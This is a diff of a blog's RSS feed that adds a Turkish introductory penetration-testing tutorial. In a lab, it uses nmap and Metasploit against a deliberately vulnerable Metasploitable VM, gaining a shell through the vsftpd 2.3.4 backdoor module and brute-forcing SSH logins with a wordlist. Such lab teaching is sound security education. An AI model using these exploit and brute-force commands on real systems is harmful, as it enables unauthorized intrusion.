@@ -6,9 +6,167 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     <description></description>
     <language>en-us</language>
-    <pubDate>Mon, 27 Mar 2017 19:56:35 +0300</pubDate>
-    <lastBuildDate>Mon, 27 Mar 2017 19:56:35 +0300</lastBuildDate>
+    <pubDate>Tue, 18 Apr 2017 13:53:20 +0300</pubDate>
+    <lastBuildDate>Tue, 18 Apr 2017 13:53:20 +0300</lastBuildDate>
 
+    
+      <item>
+        <title>Exploitation'a Giriş (Uygulama)</title>
+        <link>http://localhost:4000/exploitation-giris</link>
+        <pubDate>Tue, 18 Apr 2017 00:00:00 +0300</pubDate>
+        <author></author>
+        <description>&lt;h4&gt;Exploit nedir ?&lt;/h4&gt;
+
+&lt;p&gt;      Hedefteki belli zafiyetleri kullanarak yetki yükseltme, hedefe erişim
+sağlama , hedef üzerinde çeşitli işlemleri gerçekleştirmek amacıyla 
+oluşturulmuş araçlardır. Araçlar diyoruz çünkü bunlar sadece yazılımsal
+olmak zorunda değillerdir. Çeşitli amaçlarla üretilen &lt;strong&gt;cihazlar&lt;/strong&gt; veya &lt;strong&gt;sosyal
+mühendislik&lt;/strong&gt; durumları da birer exploit davranışı sergileyebilir.&lt;/p&gt;
+
+&lt;h4&gt;Metasploit nedir ?&lt;/h4&gt;
+
+&lt;p&gt;      Metasploit &lt;strong&gt;open-source&lt;/strong&gt; bir exploit framework’tür.  İçerisinde hazır
+exploitleri ,zararlı kod parçalarını bulundurur. Bir sistemde zafiyet tespit
+ettikten sonra buradan ilgili exploiti kullanarak sistem üzerinde 
+yapmayı amaçladığımız işleri gerçekleştirebiliriz.&lt;/p&gt;
+
+&lt;h4&gt;Metasploitable nedir ? &lt;/h4&gt;
+
+&lt;p&gt;      Metasploitable , içerisinde bilinçli olarak belli zafiyetler 
+barındıran bir linux işletim sistemidir. Bu sistem sızma testleri 
+çalışmalarında ve uygulamalarında kullanılır ve exploit edilmeye
+çalışılır.&lt;/p&gt;
+
+&lt;h3&gt;Metasploitable - Uygulama 1 &lt;/h3&gt;
+
+&lt;p&gt;      Metasploitable’ ı &lt;strong&gt;VMware&lt;/strong&gt; sanal makinesinde kurduktan sonra ana cihazımızda 
+metasploitable için  bir port taraması yapıyoruz. Öncelikle bunu 
+yapabilmek için ip adresini bilmemiz gerekiyor. Bunu genel ağ taraması
+ile de yapabiliriz. Bu uzun sürecektir. Daha kısa bir şekilde 
+metasploitable üzerinde&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;yazarak ip adresini öğrenebiliriz. 
+Sonrasında ana cihaz üzerinde&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV -T4 192.168.164.128 --open
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;yazarak metasploitable üzerindeki açık portları listeleyebiliriz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/metasploitable/nmap-taramasi.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Burada&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;21/tcp&lt;/td&gt;
+      &lt;td&gt;open&lt;/td&gt;
+      &lt;td&gt;ftp&lt;/td&gt;
+      &lt;td&gt;vsftpd 2.3.4&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;kısmını görüyoruz ve buradan açık olan &lt;strong&gt;ftp&lt;/strong&gt; portu için metasploit’te uygun exploit araması yapıyoruz.
+Bulduğumuz exploiti seçiyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; search vsftpd
+msf&amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/metasploitable/vsftpd-search.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Exploit için gerekli parametreleri görmek için aşağıdaki komutu giriyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; options
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;      Burada ‘Required’ = yes olan kısımlar girilmesi gerekli parametleri gösterir. &lt;strong&gt;RPORT&lt;/strong&gt; için current
+değerimiz 21 olarak kalabilir. &lt;strong&gt;RHOST&lt;/strong&gt; için henüz girilmiş bir değer yok bunu da ;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/metasploitable/vsftpd-options.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; set RHOST 192.168.164.128
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;olarak giriyoruz ve artık exploitimiz hazır durumda.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/metasploitable/vsftpd-run.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Hedefin komut satırı artık elimizde ,buradan amaçlarımız doğrultusunda komutlar çalıştırarak 
+çeşitli işlemler yapabiliriz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/metasploitable/vsftpd-sonuc.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h3&gt;Metasploitable - Uygulama 2 &lt;/h3&gt;
+
+&lt;p&gt;      Yine port taramasından çıkan sonuca göre ;&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22/tcp&lt;/td&gt;
+      &lt;td&gt;open&lt;/td&gt;
+      &lt;td&gt;ssh&lt;/td&gt;
+      &lt;td&gt;OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;sonucunu görüyoruz. Buradan uygun exploit ile &lt;strong&gt;brute force&lt;/strong&gt; yaparak ssh bağlantısı kurmaya çalışacağız. Anahtar kelimemizi ssh_login olarak belirleyip aratıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; search ssh_login
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;      Burada auxilary ve exploitler birlikte listelendi . &lt;strong&gt;Auxilary&lt;/strong&gt;‘ler sistem ele geçirilmeden önce 
+bilgi toplama ,analiz etme gibi amaçlarla kullanılır ama bazen birer exploit görevi de görebilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/metasploitable/ssh-search.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; use auxiliary/scanner/ssh/ssh_login
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;komutunu giriyoruz ve parametrelerini hazırlamaya başlıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; options 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;yaptıktan sonra RHOSTS gerekli bir parametre olduğunu görüyoruz ve ;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; set RHOSTS 192.168.164.128
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;yaptıktan sonra brute-force atağında kullanılmak üzere wordlistimizi de veriyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+
+msf&amp;gt; run 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;dedikten sonra ssh bağlantısı bilgilerini ele geçiriyoruz ve artık bağlantı kurabiliriz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/metasploitable/ssh-sonuc.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Böylelikle &lt;strong&gt;Metasploitable&lt;/strong&gt; üzerinde bulduğumuz zafiyetlerden yararlanarak sızma uygulaması gerçekleştirmiş olduk. Önce sistem üzerinde olası zafiyetleri belirlemek için bilgi toplama aşaması gerçekleştirdik . Sonrasında bu bilgiler ışığında kullanılabilecek zafiyetleri tespit ettik ve &lt;strong&gt;Metasploit Framework&lt;/strong&gt; üzerinden uygun exploitleri seçerek sisteme erişmeye çalıştık.&lt;/p&gt;
+
+</description>
+      </item>
     
       <item>
         <title>DVWA (Low-Level) Çözümleri</title>
